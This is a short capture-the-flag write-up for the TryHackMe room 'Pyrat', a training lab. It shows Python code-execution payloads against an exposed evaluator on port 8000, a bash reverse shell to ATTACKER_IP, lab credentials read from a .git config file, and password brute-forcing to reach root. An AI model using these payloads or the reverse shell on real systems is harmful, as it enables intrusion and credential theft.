# Pyrat v1.1 — TryHackMe Writeup

## Summary
Pyrat is a TryHackMe room involving a Python REPL exposed on port 8000, credential leakage via a `.git` config file, and privilege escalation through a hidden admin endpoint with a weak password.

## Recon
```bash
nmap -sCV 10.128.175.142 -T4
```
- Port 22: OpenSSH 8.2p1
- Port 8000: Python SimpleHTTP — evaluates input as Python code

## RCE via Python REPL
```python
exec("import os; print(os.popen('id').read())")
```

## Reverse Shell
```python
exec("import os; os.popen('bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"')")
```

## Credential Discovery
```bash
cat /opt/dev/.git/config
# username = think
# password = _TH1NKINGPirate$_
```

## User Flag
```bash
ssh think@TARGET_IP
cat /home/think/user.txt
```

## Source Code Recovery
```bash
git -C /opt/dev show HEAD
# Reveals pyrat.py.old with hidden admin endpoint
```

## Endpoint & Password Brute-force
- Endpoint `admin` discovered by probing port 8000
- Password `abc123` found via custom Python brute-force script against rockyou.txt

## Root Flag
```bash
nc TARGET_IP 8000
# admin
# abc123
# shell
cat /root/root.txt
```

## Vulnerabilities
| Step | Vulnerability |
|------|--------------|
| Initial access | Exposed Python REPL — arbitrary code execution |
| Lateral movement | Hardcoded credentials in .git/config |
| Privilege escalation | Weak admin password on hidden endpoint |
